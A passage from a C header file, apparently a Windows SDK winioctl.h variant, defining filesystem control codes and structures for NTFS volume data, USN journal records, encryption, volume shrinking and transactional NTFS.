#define FSCTL_GET_REPAIR                    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 103, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_WAIT_FOR_REPAIR               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 104, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_INITIATE_REPAIR               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 106, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSC_INTERNAL                  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 107, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_SHRINK_VOLUME                 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 108, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_SHORT_NAME_BEHAVIOR       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 109, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DFSR_SET_GHOST_HANDLE_STATE   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 110, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_TXFS_LIST_TRANSACTION_LOCKED_FILES \
                                            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 120, METHOD_BUFFERED, FILE_READ_DATA)
#define FSCTL_TXFS_LIST_TRANSACTIONS        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 121, METHOD_BUFFERED, FILE_READ_DATA)
#define FSCTL_QUERY_PAGEFILE_ENCRYPTION     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 122, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_RESET_VOLUME_ALLOCATION_HINTS CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 123, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_TXFS_READ_BACKUP_INFORMATION2 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 126, METHOD_BUFFERED, FILE_ANY_ACCESS)

#endif

#if (_WIN32_WINNT >= 0x0601)

#define FSCTL_QUERY_DEPENDENT_VOLUME        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 124, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SD_GLOBAL_CHANGE              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 125, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_LOOKUP_STREAM_FROM_CLUSTER    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 127, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_TXFS_WRITE_BACKUP_INFORMATION2 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 128, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_FILE_TYPE_NOTIFICATION        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 129, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_GET_BOOT_AREA_INFO            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 140, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_GET_RETRIEVAL_POINTER_BASE    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 141, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SET_PERSISTENT_VOLUME_STATE   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 142, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_QUERY_PERSISTENT_VOLUME_STATE CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 143, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_REQUEST_OPLOCK                CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 144, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_CSV_TUNNEL_REQUEST            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 145, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_IS_CSV_FILE                   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 146, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_QUERY_FILE_SYSTEM_RECOGNITION CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 147, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSV_GET_VOLUME_PATH_NAME      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 148, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSV_GET_VOLUME_NAME_FOR_VOLUME_MOUNT_POINT CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 149, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSV_GET_VOLUME_PATH_NAMES_FOR_VOLUME_NAME CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 150,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_IS_FILE_ON_CSV_VOLUME         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 151,  METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _CSV_NAMESPACE_INFO {
  ULONG Version;
  ULONG DeviceNumber;
  LARGE_INTEGER StartingOffset;
  ULONG SectorSize;
} CSV_NAMESPACE_INFO, *PCSV_NAMESPACE_INFO;

#define CSV_NAMESPACE_INFO_V1 (sizeof(CSV_NAMESPACE_INFO))
#define CSV_INVALID_DEVICE_NUMBER 0xFFFFFFFF

#endif

#define FSCTL_MARK_AS_SYSTEM_HIVE           FSCTL_SET_BOOTLOADER_ACCESSED

typedef struct _PATHNAME_BUFFER {
  ULONG PathNameLength;
  WCHAR Name[1];
} PATHNAME_BUFFER, *PPATHNAME_BUFFER;

typedef struct _FSCTL_QUERY_FAT_BPB_BUFFER {
  UCHAR First0x24BytesOfBootSector[0x24];
} FSCTL_QUERY_FAT_BPB_BUFFER, *PFSCTL_QUERY_FAT_BPB_BUFFER;

#if (_WIN32_WINNT >= 0x0400)

typedef struct _NTFS_VOLUME_DATA_BUFFER {
  LARGE_INTEGER VolumeSerialNumber;
  LARGE_INTEGER NumberSectors;
  LARGE_INTEGER TotalClusters;
  LARGE_INTEGER FreeClusters;
  LARGE_INTEGER TotalReserved;
  ULONG BytesPerSector;
  ULONG BytesPerCluster;
  ULONG BytesPerFileRecordSegment;
  ULONG ClustersPerFileRecordSegment;
  LARGE_INTEGER MftValidDataLength;
  LARGE_INTEGER MftStartLcn;
  LARGE_INTEGER Mft2StartLcn;
  LARGE_INTEGER MftZoneStart;
  LARGE_INTEGER MftZoneEnd;
} NTFS_VOLUME_DATA_BUFFER, *PNTFS_VOLUME_DATA_BUFFER;

typedef struct _NTFS_EXTENDED_VOLUME_DATA {
  ULONG ByteCount;
  USHORT MajorVersion;
  USHORT MinorVersion;
} NTFS_EXTENDED_VOLUME_DATA, *PNTFS_EXTENDED_VOLUME_DATA;

typedef struct _STARTING_LCN_INPUT_BUFFER {
  LARGE_INTEGER StartingLcn;
} STARTING_LCN_INPUT_BUFFER, *PSTARTING_LCN_INPUT_BUFFER;

typedef struct _VOLUME_BITMAP_BUFFER {
  LARGE_INTEGER StartingLcn;
  LARGE_INTEGER BitmapSize;
  UCHAR Buffer[1];
} VOLUME_BITMAP_BUFFER, *PVOLUME_BITMAP_BUFFER;

typedef struct _STARTING_VCN_INPUT_BUFFER {
  LARGE_INTEGER StartingVcn;
} STARTING_VCN_INPUT_BUFFER, *PSTARTING_VCN_INPUT_BUFFER;

typedef struct _RETRIEVAL_POINTERS_BUFFER {
  ULONG ExtentCount;
  LARGE_INTEGER StartingVcn;
  struct {
    LARGE_INTEGER NextVcn;
    LARGE_INTEGER Lcn;
  } Extents[1];
} RETRIEVAL_POINTERS_BUFFER, *PRETRIEVAL_POINTERS_BUFFER;

typedef struct _NTFS_FILE_RECORD_INPUT_BUFFER {
  LARGE_INTEGER FileReferenceNumber;
} NTFS_FILE_RECORD_INPUT_BUFFER, *PNTFS_FILE_RECORD_INPUT_BUFFER;

typedef struct _NTFS_FILE_RECORD_OUTPUT_BUFFER {
  LARGE_INTEGER FileReferenceNumber;
  ULONG FileRecordLength;
  UCHAR FileRecordBuffer[1];
} NTFS_FILE_RECORD_OUTPUT_BUFFER, *PNTFS_FILE_RECORD_OUTPUT_BUFFER;

typedef struct _MOVE_FILE_DATA {
  HANDLE FileHandle;
  LARGE_INTEGER StartingVcn;
  LARGE_INTEGER StartingLcn;
  ULONG ClusterCount;
} MOVE_FILE_DATA, *PMOVE_FILE_DATA;

typedef struct _MOVE_FILE_RECORD_DATA {
  HANDLE FileHandle;
  LARGE_INTEGER SourceFileRecord;
  LARGE_INTEGER TargetFileRecord;
} MOVE_FILE_RECORD_DATA, *PMOVE_FILE_RECORD_DATA;

#if defined(_WIN64)
typedef struct _MOVE_FILE_DATA32 {
  UINT32 FileHandle;
  LARGE_INTEGER StartingVcn;
  LARGE_INTEGER StartingLcn;
  ULONG ClusterCount;
} MOVE_FILE_DATA32, *PMOVE_FILE_DATA32;
#endif

#endif /* (_WIN32_WINNT >= 0x0400) */

#if (_WIN32_WINNT >= 0x0500)

typedef struct _FIND_BY_SID_DATA {
  ULONG Restart;
  SID Sid;
} FIND_BY_SID_DATA, *PFIND_BY_SID_DATA;

typedef struct _FIND_BY_SID_OUTPUT {
  ULONG NextEntryOffset;
  ULONG FileIndex;
  ULONG FileNameLength;
  WCHAR FileName[1];
} FIND_BY_SID_OUTPUT, *PFIND_BY_SID_OUTPUT;

typedef struct _MFT_ENUM_DATA {
  ULONGLONG StartFileReferenceNumber;
  USN LowUsn;
  USN HighUsn;
} MFT_ENUM_DATA, *PMFT_ENUM_DATA;

typedef struct _CREATE_USN_JOURNAL_DATA {
  ULONGLONG MaximumSize;
  ULONGLONG AllocationDelta;
} CREATE_USN_JOURNAL_DATA, *PCREATE_USN_JOURNAL_DATA;

typedef struct _READ_USN_JOURNAL_DATA {
  USN StartUsn;
  ULONG ReasonMask;
  ULONG ReturnOnlyOnClose;
  ULONGLONG Timeout;
  ULONGLONG BytesToWaitFor;
  ULONGLONG UsnJournalID;
} READ_USN_JOURNAL_DATA, *PREAD_USN_JOURNAL_DATA;

typedef struct _USN_RECORD {
  ULONG RecordLength;
  USHORT MajorVersion;
  USHORT MinorVersion;
  ULONGLONG FileReferenceNumber;
  ULONGLONG ParentFileReferenceNumber;
  USN Usn;
  LARGE_INTEGER TimeStamp;
  ULONG Reason;
  ULONG SourceInfo;
  ULONG SecurityId;
  ULONG FileAttributes;
  USHORT FileNameLength;
  USHORT FileNameOffset;
  WCHAR FileName[1];
} USN_RECORD, *PUSN_RECORD;

#define USN_PAGE_SIZE                    (0x1000)

#define USN_REASON_DATA_OVERWRITE        (0x00000001)
#define USN_REASON_DATA_EXTEND           (0x00000002)
#define USN_REASON_DATA_TRUNCATION       (0x00000004)
#define USN_REASON_NAMED_DATA_OVERWRITE  (0x00000010)
#define USN_REASON_NAMED_DATA_EXTEND     (0x00000020)
#define USN_REASON_NAMED_DATA_TRUNCATION (0x00000040)
#define USN_REASON_FILE_CREATE           (0x00000100)
#define USN_REASON_FILE_DELETE           (0x00000200)
#define USN_REASON_EA_CHANGE             (0x00000400)
#define USN_REASON_SECURITY_CHANGE       (0x00000800)
#define USN_REASON_RENAME_OLD_NAME       (0x00001000)
#define USN_REASON_RENAME_NEW_NAME       (0x00002000)
#define USN_REASON_INDEXABLE_CHANGE      (0x00004000)
#define USN_REASON_BASIC_INFO_CHANGE     (0x00008000)
#define USN_REASON_HARD_LINK_CHANGE      (0x00010000)
#define USN_REASON_COMPRESSION_CHANGE    (0x00020000)
#define USN_REASON_ENCRYPTION_CHANGE     (0x00040000)
#define USN_REASON_OBJECT_ID_CHANGE      (0x00080000)
#define USN_REASON_REPARSE_POINT_CHANGE  (0x00100000)
#define USN_REASON_STREAM_CHANGE         (0x00200000)
#define USN_REASON_TRANSACTED_CHANGE     (0x00400000)
#define USN_REASON_CLOSE                 (0x80000000)

typedef struct _USN_JOURNAL_DATA {
  ULONGLONG UsnJournalID;
  USN FirstUsn;
  USN NextUsn;
  USN LowestValidUsn;
  USN MaxUsn;
  ULONGLONG MaximumSize;
  ULONGLONG AllocationDelta;
} USN_JOURNAL_DATA, *PUSN_JOURNAL_DATA;

typedef struct _DELETE_USN_JOURNAL_DATA {
  ULONGLONG UsnJournalID;
  ULONG DeleteFlags;
} DELETE_USN_JOURNAL_DATA, *PDELETE_USN_JOURNAL_DATA;

#define USN_DELETE_FLAG_DELETE              (0x00000001)
#define USN_DELETE_FLAG_NOTIFY              (0x00000002)
#define USN_DELETE_VALID_FLAGS              (0x00000003)

typedef struct _MARK_HANDLE_INFO {
  ULONG UsnSourceInfo;
  HANDLE VolumeHandle;
  ULONG HandleInfo;
} MARK_HANDLE_INFO, *PMARK_HANDLE_INFO;

#if defined(_WIN64)
typedef struct _MARK_HANDLE_INFO32 {
  ULONG UsnSourceInfo;
  UINT32 VolumeHandle;
  ULONG HandleInfo;
} MARK_HANDLE_INFO32, *PMARK_HANDLE_INFO32;
#endif

#define USN_SOURCE_DATA_MANAGEMENT          (0x00000001)
#define USN_SOURCE_AUXILIARY_DATA           (0x00000002)
#define USN_SOURCE_REPLICATION_MANAGEMENT   (0x00000004)

#define MARK_HANDLE_PROTECT_CLUSTERS        (0x00000001)
#define MARK_HANDLE_TXF_SYSTEM_LOG          (0x00000004)
#define MARK_HANDLE_NOT_TXF_SYSTEM_LOG      (0x00000008)

typedef struct _BULK_SECURITY_TEST_DATA {
  ACCESS_MASK DesiredAccess;
  ULONG SecurityIds[1];
} BULK_SECURITY_TEST_DATA, *PBULK_SECURITY_TEST_DATA;

#define VOLUME_IS_DIRTY                  (0x00000001)
#define VOLUME_UPGRADE_SCHEDULED         (0x00000002)
#define VOLUME_SESSION_OPEN              (0x00000004)

typedef struct _FILE_PREFETCH {
  ULONG Type;
  ULONG Count;
  ULONGLONG Prefetch[1];
} FILE_PREFETCH, *PFILE_PREFETCH;

typedef struct _FILE_PREFETCH_EX {
  ULONG Type;
  ULONG Count;
  PVOID Context;
  ULONGLONG Prefetch[1];
} FILE_PREFETCH_EX, *PFILE_PREFETCH_EX;

#define FILE_PREFETCH_TYPE_FOR_CREATE       0x1
#define FILE_PREFETCH_TYPE_FOR_DIRENUM      0x2
#define FILE_PREFETCH_TYPE_FOR_CREATE_EX    0x3
#define FILE_PREFETCH_TYPE_FOR_DIRENUM_EX   0x4

#define FILE_PREFETCH_TYPE_MAX              0x4

typedef struct _FILE_OBJECTID_BUFFER {
  UCHAR ObjectId[16];
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      UCHAR BirthVolumeId[16];
      UCHAR BirthObjectId[16];
      UCHAR DomainId[16];
    } DUMMYSTRUCTNAME;
    UCHAR ExtendedInfo[48];
  } DUMMYUNIONNAME;
} FILE_OBJECTID_BUFFER, *PFILE_OBJECTID_BUFFER;

typedef struct _FILE_SET_SPARSE_BUFFER {
  BOOLEAN SetSparse;
} FILE_SET_SPARSE_BUFFER, *PFILE_SET_SPARSE_BUFFER;

typedef struct _FILE_ZERO_DATA_INFORMATION {
  LARGE_INTEGER FileOffset;
  LARGE_INTEGER BeyondFinalZero;
} FILE_ZERO_DATA_INFORMATION, *PFILE_ZERO_DATA_INFORMATION;

typedef struct _FILE_ALLOCATED_RANGE_BUFFER {
  LARGE_INTEGER FileOffset;
  LARGE_INTEGER Length;
} FILE_ALLOCATED_RANGE_BUFFER, *PFILE_ALLOCATED_RANGE_BUFFER;

typedef struct _ENCRYPTION_BUFFER {
  ULONG EncryptionOperation;
  UCHAR Private[1];
} ENCRYPTION_BUFFER, *PENCRYPTION_BUFFER;

#define FILE_SET_ENCRYPTION         0x00000001
#define FILE_CLEAR_ENCRYPTION       0x00000002
#define STREAM_SET_ENCRYPTION       0x00000003
#define STREAM_CLEAR_ENCRYPTION     0x00000004

#define MAXIMUM_ENCRYPTION_VALUE    0x00000004

typedef struct _DECRYPTION_STATUS_BUFFER {
  BOOLEAN NoEncryptedStreams;
} DECRYPTION_STATUS_BUFFER, *PDECRYPTION_STATUS_BUFFER;

#define ENCRYPTION_FORMAT_DEFAULT        (0x01)

#define COMPRESSION_FORMAT_SPARSE        (0x4000)

typedef struct _REQUEST_RAW_ENCRYPTED_DATA {
  LONGLONG FileOffset;
  ULONG Length;
} REQUEST_RAW_ENCRYPTED_DATA, *PREQUEST_RAW_ENCRYPTED_DATA;

typedef struct _ENCRYPTED_DATA_INFO {
  ULONGLONG StartingFileOffset;
  ULONG OutputBufferOffset;
  ULONG BytesWithinFileSize;
  ULONG BytesWithinValidDataLength;
  USHORT CompressionFormat;
  UCHAR DataUnitShift;
  UCHAR ChunkShift;
  UCHAR ClusterShift;
  UCHAR EncryptionFormat;
  USHORT NumberOfDataBlocks;
  ULONG DataBlockSize[ANYSIZE_ARRAY];
} ENCRYPTED_DATA_INFO, *PENCRYPTED_DATA_INFO;

typedef struct _PLEX_READ_DATA_REQUEST {
  LARGE_INTEGER ByteOffset;
  ULONG ByteLength;
  ULONG PlexNumber;
} PLEX_READ_DATA_REQUEST, *PPLEX_READ_DATA_REQUEST;

typedef struct _SI_COPYFILE {
  ULONG SourceFileNameLength;
  ULONG DestinationFileNameLength;
  ULONG Flags;
  WCHAR FileNameBuffer[1];
} SI_COPYFILE, *PSI_COPYFILE;

#define COPYFILE_SIS_LINK       0x0001
#define COPYFILE_SIS_REPLACE    0x0002
#define COPYFILE_SIS_FLAGS      0x0003

#endif /* (_WIN32_WINNT >= 0x0500) */

#if (_WIN32_WINNT >= 0x0600)

typedef struct _FILE_MAKE_COMPATIBLE_BUFFER {
  BOOLEAN CloseDisc;
} FILE_MAKE_COMPATIBLE_BUFFER, *PFILE_MAKE_COMPATIBLE_BUFFER;

typedef struct _FILE_SET_DEFECT_MGMT_BUFFER {
  BOOLEAN Disable;
} FILE_SET_DEFECT_MGMT_BUFFER, *PFILE_SET_DEFECT_MGMT_BUFFER;

typedef struct _FILE_QUERY_SPARING_BUFFER {
  ULONG SparingUnitBytes;
  BOOLEAN SoftwareSparing;
  ULONG TotalSpareBlocks;
  ULONG FreeSpareBlocks;
} FILE_QUERY_SPARING_BUFFER, *PFILE_QUERY_SPARING_BUFFER;

typedef struct _FILE_QUERY_ON_DISK_VOL_INFO_BUFFER {
  LARGE_INTEGER DirectoryCount;
  LARGE_INTEGER FileCount;
  USHORT FsFormatMajVersion;
  USHORT FsFormatMinVersion;
  WCHAR FsFormatName[12];
  LARGE_INTEGER FormatTime;
  LARGE_INTEGER LastUpdateTime;
  WCHAR CopyrightInfo[34];
  WCHAR AbstractInfo[34];
  WCHAR FormattingImplementationInfo[34];
  WCHAR LastModifyingImplementationInfo[34];
} FILE_QUERY_ON_DISK_VOL_INFO_BUFFER, *PFILE_QUERY_ON_DISK_VOL_INFO_BUFFER;

#define SET_REPAIR_ENABLED                                      (0x00000001)
#define SET_REPAIR_VOLUME_BITMAP_SCAN                           (0x00000002)
#define SET_REPAIR_DELETE_CROSSLINK                             (0x00000004)
#define SET_REPAIR_WARN_ABOUT_DATA_LOSS                         (0x00000008)
#define SET_REPAIR_DISABLED_AND_BUGCHECK_ON_CORRUPT             (0x00000010)
#define SET_REPAIR_VALID_MASK                                   (0x0000001F)

typedef enum _SHRINK_VOLUME_REQUEST_TYPES {
  ShrinkPrepare = 1,
  ShrinkCommit,
  ShrinkAbort
} SHRINK_VOLUME_REQUEST_TYPES, *PSHRINK_VOLUME_REQUEST_TYPES;

typedef struct _SHRINK_VOLUME_INFORMATION {
  SHRINK_VOLUME_REQUEST_TYPES ShrinkRequestType;
  ULONGLONG Flags;
  LONGLONG NewNumberOfSectors;
} SHRINK_VOLUME_INFORMATION, *PSHRINK_VOLUME_INFORMATION;

#define TXFS_RM_FLAG_LOGGING_MODE                           0x00000001
#define TXFS_RM_FLAG_RENAME_RM                              0x00000002
#define TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MAX                0x00000004
#define TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MIN                0x00000008
#define TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS    0x00000010
#define TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT           0x00000020
#define TXFS_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE             0x00000040
#define TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX             0x00000080
#define TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN             0x00000100
#define TXFS_RM_FLAG_GROW_LOG                               0x00000400
#define TXFS_RM_FLAG_SHRINK_LOG                             0x00000800
#define TXFS_RM_FLAG_ENFORCE_MINIMUM_SIZE                   0x00001000
#define TXFS_RM_FLAG_PRESERVE_CHANGES                       0x00002000
#define TXFS_RM_FLAG_RESET_RM_AT_NEXT_START                 0x00004000
#define TXFS_RM_FLAG_DO_NOT_RESET_RM_AT_NEXT_START          0x00008000
#define TXFS_RM_FLAG_PREFER_CONSISTENCY                     0x00010000
#define TXFS_RM_FLAG_PREFER_AVAILABILITY                    0x00020000

#define TXFS_LOGGING_MODE_SIMPLE        (0x0001)
#define TXFS_LOGGING_MODE_FULL          (0x0002)

#define TXFS_TRANSACTION_STATE_NONE         0x00
#define TXFS_TRANSACTION_STATE_ACTIVE       0x01
#define TXFS_TRANSACTION_STATE_PREPARED     0x02
#define TXFS_TRANSACTION_STATE_NOTACTIVE    0x03

#define TXFS_MODIFY_RM_VALID_FLAGS (TXFS_RM_FLAG_LOGGING_MODE                        | \
                                    TXFS_RM_FLAG_RENAME_RM                           | \
                                    TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MAX             | \
                                    TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MIN             | \
                                    TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS | \
                                    TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT        | \
                                    TXFS_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE          | \
                                    TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX          | \
                                    TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN          | \
                                    TXFS_RM_FLAG_SHRINK_LOG                          | \
                                    TXFS_RM_FLAG_GROW_LOG                            | \
                                    TXFS_RM_FLAG_ENFORCE_MINIMUM_SIZE                | \
                                    TXFS_RM_FLAG_PRESERVE_CHANGES                    | \
                                    TXFS_RM_FLAG_RESET_RM_AT_NEXT_START              | \
                                    TXFS_RM_FLAG_DO_NOT_RESET_RM_AT_NEXT_START       | \
                                    TXFS_RM_FLAG_PREFER_CONSISTENCY                  | \
                                    TXFS_RM_FLAG_PREFER_AVAILABILITY)

typedef struct _TXFS_MODIFY_RM {
  ULONG Flags;
  ULONG LogContainerCountMax;
  ULONG LogContainerCountMin;
  ULONG LogContainerCount;
  ULONG LogGrowthIncrement;
  ULONG LogAutoShrinkPercentage;
  ULONGLONG Reserved;
  USHORT LoggingMode;
} TXFS_MODIFY_RM, *PTXFS_MODIFY_RM;

#define TXFS_RM_STATE_NOT_STARTED       0
#define TXFS_RM_STATE_STARTING          1
#define TXFS_RM_STATE_ACTIVE            2
#define TXFS_RM_STATE_SHUTTING_DOWN     3

#define TXFS_QUERY_RM_INFORMATION_VALID_FLAGS                           \
                (TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS   |   \
                 TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT          |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX            |   \
                 TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN            |   \
                 TXFS_RM_FLAG_RESET_RM_AT_NEXT_START                |   \
                 TXFS_RM_FLAG_DO_NOT_RESET_RM_AT_NEXT_START         |   \
                 TXFS_RM_FLAG_PREFER_CONSISTENCY                    |   \
                 TXFS_RM_FLAG_PREFER_AVAILABILITY)

typedef struct _TXFS_QUERY_RM_INFORMATION {
  ULONG BytesRequired;
  ULONGLONG TailLsn;
  ULONGLONG CurrentLsn;
  ULONGLONG ArchiveTailLsn;
  ULONGLONG LogContainerSize;
  LARGE_INTEGER HighestVirtualClock;
  ULONG LogContainerCount;
  ULONG LogContainerCountMax;
  ULONG LogContainerCountMin;
  ULONG LogGrowthIncrement;
  ULONG LogAutoShrinkPercentage;
  ULONG Flags;
  USHORT LoggingMode;
  USHORT Reserved;
  ULONG RmState;
  ULONGLONG LogCapacity;
  ULONGLONG LogFree;
  ULONGLONG TopsSize;
  ULONGLONG TopsUsed;
  ULONGLONG TransactionCount;
  ULONGLONG OnePCCount;
  ULONGLONG TwoPCCount;
  ULONGLONG NumberLogFileFull;
  ULONGLONG OldestTransactionAge;
  GUID RMName;
  ULONG TmLogPathOffset;
} TXFS_QUERY_RM_INFORMATION, *PTXFS_QUERY_RM_INFORMATION;

#define TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_REDO_LSN        0x01
#define TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_VIRTUAL_CLOCK   0x02

#define TXFS_ROLLFORWARD_REDO_VALID_FLAGS                               \
                (TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_REDO_LSN |         \
                 TXFS_ROLLFORWARD_REDO_FLAG_USE_LAST_VIRTUAL_CLOCK)

typedef struct _TXFS_ROLLFORWARD_REDO_INFORMATION {
  LARGE_INTEGER LastVirtualClock;
  ULONGLONG LastRedoLsn;
  ULONGLONG HighestRecoveryLsn;
  ULONG Flags;
} TXFS_ROLLFORWARD_REDO_INFORMATION, *PTXFS_ROLLFORWARD_REDO_INFORMATION;

#define TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MAX              0x00000001
#define TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MIN              0x00000002
#define TXFS_START_RM_FLAG_LOG_CONTAINER_SIZE                   0x00000004
#define TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS  0x00000008
#define TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT         0x00000010
#define TXFS_START_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE           0x00000020
#define TXFS_START_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX           0x00000040
#define TXFS_START_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN           0x00000080

#define TXFS_START_RM_FLAG_RECOVER_BEST_EFFORT                  0x00000200
#define TXFS_START_RM_FLAG_LOGGING_MODE                         0x00000400
#define TXFS_START_RM_FLAG_PRESERVE_CHANGES                     0x00000800

#define TXFS_START_RM_FLAG_PREFER_CONSISTENCY                   0x00001000
#define TXFS_START_RM_FLAG_PREFER_AVAILABILITY                  0x00002000

#define TXFS_START_RM_VALID_FLAGS                                           \
                (TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MAX             |   \
                 TXFS_START_RM_FLAG_LOG_CONTAINER_COUNT_MIN             |   \
                 TXFS_START_RM_FLAG_LOG_CONTAINER_SIZE                  |   \
                 TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS |   \
                 TXFS_START_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT        |   \
                 TXFS_START_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE          |   \
                 TXFS_START_RM_FLAG_RECOVER_BEST_EFFORT                 |   \
                 TXFS_START_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX          |   \
                 TXFS_START_RM_FLAG_LOGGING_MODE                        |   \
                 TXFS_START_RM_FLAG_PRESERVE_CHANGES                    |   \
                 TXFS_START_RM_FLAG_PREFER_CONSISTENCY                  |   \
                 TXFS_START_RM_FLAG_PREFER_AVAILABILITY)

typedef struct _TXFS_START_RM_INFORMATION {
  ULONG Flags;
  ULONGLONG LogContainerSize;
  ULONG LogContainerCountMin;
  ULONG LogContainerCountMax;
  ULONG LogGrowthIncrement;
  ULONG LogAutoShrinkPercentage;
  ULONG TmLogPathOffset;
  USHORT TmLogPathLength;
  USHORT LoggingMode;
  USHORT LogPathLength;
  USHORT Reserved;
  WCHAR LogPath[1];
} TXFS_START_RM_INFORMATION, *PTXFS_START_RM_INFORMATION;

typedef struct _TXFS_GET_METADATA_INFO_OUT {
  struct {
    LONGLONG LowPart;
    LONGLONG HighPart;
  } TxfFileId;
  GUID LockingTransaction;
  ULONGLONG LastLsn;
  ULONG TransactionState;
} TXFS_GET_METADATA_INFO_OUT, *PTXFS_GET_METADATA_INFO_OUT;

#define TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY_FLAG_CREATED   0x00000001
#define TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY_FLAG_DELETED   0x00000002

typedef struct _TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY {
  ULONGLONG Offset;
  ULONG NameFlags;
  LONGLONG FileId;
  ULONG Reserved1;
  ULONG Reserved2;
  LONGLONG Reserved3;
  WCHAR FileName[1];
} TXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY, *PTXFS_LIST_TRANSACTION_LOCKED_FILES_ENTRY;

typedef struct _TXFS_LIST_TRANSACTION_LOCKED_FILES {
  GUID KtmTransaction;
  ULONGLONG NumberOfFiles;
  ULONGLONG BufferSizeRequired;
  ULONGLONG Offset;
} TXFS_LIST_TRANSACTION_LOCKED_FILES, *PTXFS_LIST_TRANSACTION_LOCKED_FILES;

typedef struct _TXFS_LIST_TRANSACTIONS_ENTRY {
  GUID TransactionId;
  ULONG TransactionState;
  ULONG Reserved1;
  ULONG Reserved2;
  LONGLONG Reserved3;
} TXFS_LIST_TRANSACTIONS_ENTRY, *PTXFS_LIST_TRANSACTIONS_ENTRY;

